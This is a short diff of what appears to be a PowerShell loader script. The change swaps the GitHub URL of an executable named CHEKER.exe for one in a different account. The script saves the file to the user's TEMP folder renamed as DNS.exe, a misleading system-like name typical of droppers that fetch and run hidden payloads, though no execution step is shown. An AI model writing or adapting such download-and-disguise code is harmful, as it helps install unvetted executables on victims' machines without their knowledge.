@@ -1,5 +1,5 @@
 # Путь к файлу на удаленном сервере
-$url = "https://github.com/FREAKMANCHIK/WORK/raw/main/files/CHEKER.exe"
+$url = "https://github.com/WENBLS/WORK/blob/main/files/CHEKER.exe"
 
 
 $outputPath = Join-Path -Path $env:TEMP -ChildPath "DNS.exe"
